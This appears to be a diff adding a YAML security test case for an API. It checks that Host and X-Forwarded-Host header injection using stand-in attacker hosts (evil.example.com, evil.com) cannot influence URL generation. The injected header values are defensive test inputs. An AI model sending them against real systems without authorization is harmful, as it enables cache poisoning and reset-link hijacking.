+    platforms: [api]
+    steps:
+      - name: "Send request with manipulated Host header"
+        action: "GET /api/v1/health with Host: evil.example.com"
+        expected: "200 OK but no redirect or link generation pointing to evil.example.com"
+      - name: "Send request with X-Forwarded-Host injection"
+        action: "GET /api/v1/health with X-Forwarded-Host: evil.example.com"
+        expected: "Server does not use injected host for URL generation"
+      - name: "Verify password reset flow (if exists) does not use Host header"
+        action: "Check any URL generation in API responses (pagination links, resource URLs)"
+        expected: "URLs reference actual server host, not injected Host header value"
+      - name: "Send request with multiple Host headers"
+        action: "GET /api/v1/health with two Host headers: localhost and evil.com"
+        expected: "400 Bad Request or only first Host used"
+    tags: [security, header-injection, host-header, x-forwarded-host, cache-poisoning]
+    estimated_duration: "10s"
+    expected_result: "Host header manipulation cannot influence server behavior or URL generation"
